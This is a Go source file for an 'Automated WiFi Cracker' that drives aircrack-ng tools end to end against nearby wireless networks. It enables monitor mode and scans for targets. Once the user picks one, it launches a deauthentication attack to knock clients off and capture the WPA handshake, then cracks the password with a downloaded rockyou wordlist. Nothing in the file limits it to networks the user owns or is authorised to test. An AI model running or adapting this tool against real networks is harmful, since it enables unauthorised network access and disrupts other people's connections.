package main

import (
	"bufio"
	"fmt"
	"os"
	"os/exec"
	"os/signal"
	"path/filepath"
	"runtime"
	"strconv"
	"strings"
	"syscall"
	"time"

	"github.com/fatih/color"
)

type Network struct {
	BSSID  string
	CH     string
	ESSID  string
	Sec    string
	Client string
}

// Color definitions
var (
	cyan   = color.New(color.FgCyan, color.Bold)
	green  = color.New(color.FgGreen, color.Bold)
	yellow = color.New(color.FgYellow, color.Bold)
	red    = color.New(color.FgRed, color.Bold)
	white  = color.New(color.FgWhite, color.Bold)

	// Global variables for graceful cleanup
	monIface   string
	activeCmds []*exec.Cmd
)

func main() {
	// Setup graceful termination (Ctrl+C handling)
	setupSignalHandler()

	// 1. Root check
	if os.Geteuid() != 0 {
		red.Println("[!] ERROR: This tool requires root privileges. Please run with 'sudo'.")
		os.Exit(1)
	}

	cyan.Println("=======================================")
	cyan.Println("    Automated WiFi Cracker CLI v3.0   ")
	cyan.Println("=======================================")

	// 2. Auto Environment Setup & Optimization
	setupEnvironment()

	reader := bufio.NewReader(os.Stdin)

	// 3. Interface Input
	white.Print("\n[*] Enter Wireless Interface (e.g., wlp1s0): ")
	iface, err := reader.ReadString('\n')
	if err != nil {
		red.Printf("[-] Failed to read input: %v\n", err)
		os.Exit(1)
	}
	iface = strings.TrimSpace(iface)
	if iface == "" {
		red.Println("[-] Interface name cannot be empty.")
		os.Exit(1)
	}

	// Assumption: airmon-ng appends "mon" (can be made more dynamic, but sufficient for this scope)
	monIface = iface + "mon"

	yellow.Println("\n[*] Enabling Monitor Mode...")
	runCmd("airmon-ng", "check", "kill")
	runCmd("airmon-ng", "start", iface)
	green.Println("[+] Monitor Mode enabled successfully.")

	// Defer cleanup to ensure we exit cleanly under normal completion
	defer cleanup()

	// 4. Scanning Networks
	networks := scanNetworks()

	// 5. Target Selection
	target := selectTarget(networks, reader)

	// 6. Directory Structure Creation
	sanitizedEssid := strings.ReplaceAll(target.ESSID, " ", "_")
	sanitizedEssid = strings.ReplaceAll(sanitizedEssid, "/", "_") // Prevent path traversal
	targetDir := filepath.Join("data", sanitizedEssid)

	yellow.Printf("\n[*] Creating directory for target: %s\n", targetDir)
	if err := os.MkdirAll(targetDir, 0755); err != nil {
		red.Printf("[-] ERROR: Failed to create directory: %v\n", err)
		os.Exit(1)
	}
	green.Println("[+] Directory ready.")

	capFile := filepath.Join(targetDir, "handshake")

	// 7. Handshake Capture & Deauth Attack
	captureHandshake(target, capFile)

	// 8. Password Cracking (Optimized)
	crackPassword(capFile, targetDir)

	green.Printf("\n[+] All files for '%s' are stored in: %s\n", target.ESSID, targetDir)
}

func setupSignalHandler() {
	c := make(chan os.Signal, 1)
	signal.Notify(c, os.Interrupt, syscall.SIGTERM)
	go func() {
		<-c
		fmt.Println()
		red.Println("\n[!] Interrupted by user. Cleaning up...")
		cleanup()
		os.Exit(1)
	}()
}

func cleanup() {
	yellow.Println("\n[*] Performing cleanup operations...")

	// Kill active background processes and prevent zombie processes
	for _, cmd := range activeCmds {
		if cmd != nil && cmd.Process != nil {
			cmd.Process.Kill()
			cmd.Wait()
		}
	}
	activeCmds = nil // Reset slice

	// Stop monitor mode if it was started
	if monIface != "" {
		yellow.Printf("[*] Disabling monitor mode on %s...\n", monIface)
		runCmd("airmon-ng", "stop", monIface)
	}

	// Restore NetworkManager
	yellow.Println("[*] Restarting NetworkManager...")
	runCmd("systemctl", "start", "NetworkManager")

	// Clean up temp scan files
	os.Remove("scan_temp-01.csv")

	green.Println("[+] Cleanup complete.")
}

func scanNetworks() []Network {
	yellow.Println("\n[*] Scanning networks for 15 seconds...")
	scanFile := "scan_temp"

	// Remove old temp files if they exist
	os.Remove(scanFile + "-01.csv")

	cmd := exec.Command("airodump-ng", monIface, "-w", scanFile, "--output-format", "csv")
	cmd.Stdout = nil
	cmd.Stderr = nil
	if err := cmd.Start(); err != nil {
		red.Printf("[-] Failed to start airodump-ng: %v\n", err)
		cleanup()
		os.Exit(1)
	}
	activeCmds = append(activeCmds, cmd)

	time.Sleep(15 * time.Second)

	if cmd.Process != nil {
		cmd.Process.Kill()
		cmd.Wait()
	}
	green.Println("[+] Scan completed.")

	networks := parseCSV(scanFile + "-01.csv")
	if len(networks) == 0 {
		red.Println("[-] ERROR: No networks found or CSV file not generated.")
		cleanup()
		os.Exit(1)
	}

	fmt.Println()
	cyan.Println("=== Discovered WiFi Networks ===")
	for i, net := range networks {
		fmt.Printf("[%d] ESSID: %s | BSSID: %s | CH: %s | Security: %s\n", i+1, net.ESSID, net.BSSID, net.CH, net.Sec)
	}

	return networks
}

func selectTarget(networks []Network, reader *bufio.Reader) Network {
	for {
		white.Print("\n[*] Enter the number of the target network: ")
		input, err := reader.ReadString('\n')
		if err != nil {
			red.Printf("[-] Failed to read input: %v\n", err)
			cleanup()
			os.Exit(1)
		}

		input = strings.TrimSpace(input)
		choice, err := strconv.Atoi(input)

		// Validate user input bounds
		if err != nil || choice < 1 || choice > len(networks) {
			red.Println("[-] ERROR: Invalid selection. Please enter a valid number.")
			continue
		}

		target := networks[choice-1]
		yellow.Printf("\n[*] Target Selected: %s (%s)\n", target.ESSID, target.BSSID)
		return target
	}
}

func captureHandshake(target Network, capFile string) {
	yellow.Println("[*] Starting Handshake Capture...")

	cmd := exec.Command("airodump-ng", "-c", target.CH, "--bssid", target.BSSID, "-w", capFile, monIface)
	cmd.Stdout = nil
	cmd.Stderr = nil
	if err := cmd.Start(); err != nil {
		red.Printf("[-] Failed to start capture: %v\n", err)
		cleanup()
		os.Exit(1)
	}
	activeCmds = append(activeCmds, cmd)

	time.Sleep(2 * time.Second) // Wait for airodump to lock channel

	yellow.Println("[*] Launching Deauth Attack (10 seconds)...")
	deauthArgs := []string{"--deauth", "10", "-a", target.BSSID, monIface}
	if target.Client != "" {
		deauthArgs = append(deauthArgs, "-c", target.Client)
	}
	runCmd("aireplay-ng", deauthArgs...)

	time.Sleep(5 * time.Second) // Wait for handshake to save

	if cmd.Process != nil {
		cmd.Process.Kill()
		cmd.Wait()
	}
	green.Println("[+] Capture phase completed.")
}

func crackPassword(capFile string, targetDir string) {
	finalCapFile := capFile + "-01.cap"
	cores := runtime.NumCPU()

	cyan.Println("\n=======================================")
	cyan.Println("       Starting Password Cracking      ")
	cyan.Println("=======================================")
	yellow.Printf("[*] File: %s\n", finalCapFile)
	yellow.Printf("[*] Wordlist: rockyou_clean.txt (Passwords < 8 chars removed)\n")
	yellow.Printf("[*] CPU Threads: %d (Multi-threading Enabled)\n", cores)
	fmt.Println()

	runCmd("aircrack-ng", "-p", fmt.Sprintf("%d", cores), "-w", "/usr/share/wordlists/rockyou_clean.txt", finalCapFile)
}

// ================= Auto Setup & Optimization Function =================
func setupEnvironment() {
	yellow.Println("\n[*] Checking environment dependencies...")

	if _, err := exec.LookPath("aircrack-ng"); err != nil {
		red.Println("[-] aircrack-ng not found. Installing...")
		runCmd("apt", "update")
		runCmd("apt", "install", "aircrack-ng", "-y")
	} else {
		green.Println("[+] aircrack-ng is already installed.")
	}

	if _, err := exec.LookPath("wget"); err != nil {
		red.Println("[-] wget not found. Installing...")
		runCmd("apt", "install", "wget", "-y")
	}

	wordlistPath := "/usr/share/wordlists/rockyou.txt"
	if _, err := os.Stat(wordlistPath); os.IsNotExist(err) {
		red.Println("[-] rockyou.txt not found. Downloading (130MB)...")
		runCmd("mkdir", "-p", "/usr/share/wordlists")
		runCmd("wget", "https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt", "-O", wordlistPath)
		green.Println("[+] rockyou.txt downloaded successfully.")
	} else {
		green.Println("[+] rockyou.txt is already downloaded.")
	}

	cleanWordlistPath := "/usr/share/wordlists/rockyou_clean.txt"
	if _, err := os.Stat(cleanWordlistPath); os.IsNotExist(err) {
		yellow.Println("[*] Optimizing Wordlist: Removing passwords shorter than 8 characters...")
		cleanFile, err := os.Create(cleanWordlistPath)
		if err != nil {
			red.Printf("[-] Failed to create clean wordlist: %v\n", err)
			return
		}
		defer cleanFile.Close()

		awkCmd := exec.Command("awk", "length>=8", wordlistPath)
		awkCmd.Stdout = cleanFile
		awkCmd.Stderr = os.Stderr
		if err := awkCmd.Run(); err != nil {
			red.Printf("[-] Wordlist optimization failed: %v\n", err)
		} else {
			green.Println("[+] Optimization complete. 'rockyou_clean.txt' created.")
		}
	} else {
		green.Println("[+] Optimized wordlist 'rockyou_clean.txt' is ready.")
	}
}

// ================= Helper Functions =================
func runCmd(name string, args ...string) {
	cmd := exec.Command(name, args...)
	cmd.Stdout = os.Stdout
	cmd.Stderr = os.Stderr
	cmd.Run()
}

func parseCSV(filename string) []Network {
	file, err := os.Open(filename)
	if err != nil {
		return nil
	}
	defer file.Close()

	var networks []Network
	scanner := bufio.NewScanner(file)
	isStation := false

	for scanner.Scan() {
		line := scanner.Text()
		if strings.Contains(line, "Station MAC") {
			isStation = true
			continue
		}

		parts := strings.Split(line, ",")
		if len(parts) < 14 {
			continue
		}

		if !isStation {
			bssid := strings.TrimSpace(parts[0])
			ch := strings.TrimSpace(parts[3])
			sec := strings.TrimSpace(parts[5])
			essid := strings.TrimSpace(parts[13])
			if bssid != "" && essid != "" {
				networks = append(networks, Network{
					BSSID: bssid,
					CH:    ch,
					ESSID: essid,
					Sec:   sec,
				})
			}
		} else {
			stationMac := strings.TrimSpace(parts[0])
			targetBSSID := strings.TrimSpace(parts[5])
			for i := range networks {
				if networks[i].BSSID == targetBSSID && networks[i].Client == "" {
					networks[i].Client = stationMac
					break
				}
			}
		}
	}
	return networks
}
